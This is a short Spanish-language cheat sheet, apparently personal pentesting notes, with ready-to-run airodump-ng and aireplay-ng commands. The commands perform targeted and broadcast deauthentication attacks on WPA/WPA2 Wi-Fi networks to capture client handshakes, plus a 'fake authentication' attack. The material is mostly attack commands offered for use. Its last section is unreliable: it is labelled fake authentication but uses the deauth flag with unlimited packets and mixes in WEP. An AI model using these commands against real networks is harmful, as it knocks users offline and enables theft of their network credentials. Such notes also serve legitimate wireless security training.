# Ataques 

Tags: #WPA/WPA2 #Attack #Aireplay

## Ataque deautenticación dirigido (WPA/WPA2)

```bash 
1. Para iniciar el ataque debemos de capturar el trafico del AP y mantenerlo asi hasta tener el 'Handshake' del cliente

❯ airodump-ng -c 1 --bssid <MAC> <wlan0mon> -w Captura # Guardaremos la captura de datos en varios archivos, pero el que nos interesa (.cap), la passwd esta cifrada
```

```bash 
2. Mirar cada cliente y ver que en 'Frames' el numero vaya en aumento, esto nos indica que el cliente esta activo en la red 
3. Copiamos la MAC 'Station' del cliente a deautenticar 
4. Ejecutamos la técnica para hacer la deautenticación

❯ aireplay-ng -0 10 -e <ESSID> -c <MAC> <wlan0mon>
	# --deauth (-0) = Deautentica todas las estaciones (MAC) 
	# 10 = Numero de paquetes a emitir 
	# e = ESSID del AP
	# c = MAC del cliente (Station)

5. El cliente perderá conectividad y en segundos volvera a autenticarse y conectarse al AP, es ahí donde ya hemos capturado el 'Handshake' con las credenciales. 
```

## Ataque deautenticación global (WPA/WPA2)

```bash 
1. Para iniciar el ataque debemos de capturar el trafico del AP y mantenerlo asi hasta tener el 'Handshake' del cliente

❯ airodump-ng -c 1 --bssid <MAC> <wlan0mon> -w Captura # Guardaremos la captura de datos en varios archivos, pero el que nos interesa (.cap), la passwd esta cifrada
```

```bash 
2. Haremos un ataque de deautenticación global a traves de la 'MAC broadcast address'

❯ aireplay-ng -0 10 -e <ESSID> -c FF:FF:FF:FF:FF:FF <wlan0mon>
❯ aireplay-ng -0 10 -e <ESSID> <wlan0mon>                           # Esta es otra forma de hacerlo sin indicar la MAC broadcast
	# --deauth (-0) = Deautentica todas las estaciones (MAC) 
	# 10 = Numero de paquetes a emitir 
	# e = ESSID del AP
	# c = MAC del cliente (Station)
```

## Ataque falsa autenticación 

```bash 
1. Para iniciar el ataque debemos de capturar el trafico del AP y mantenerlo asi hasta tener el 'Handshake' del cliente

❯ airodump-ng -c 1 --bssid <MAC> <wlan0mon> -w Captura # Guardaremos la captura de datos en varios archivos, pero el que nos interesa (.cap), la passwd esta cifrada
```

```bash 
2. Si la red no tiene clientes, puedes hacer este tipo de ataque, esto es funcional en redes 'WEP'

❯ aireplay-ng -0 0 -e <ESSID> -a <BSSID> -h <Falsa-MAC> <wlan0mon>
	# --deauth (-0) = Deautentica todas las estaciones (MAC) 
	# 0 = Numero de paquetes a emitir (En este caso es infinito)
	# e = ESSID del AP
	# h = MAC falsa para podernos conectar (00:0c:f1:da:ab:82)
	# a = BSSID del AP
```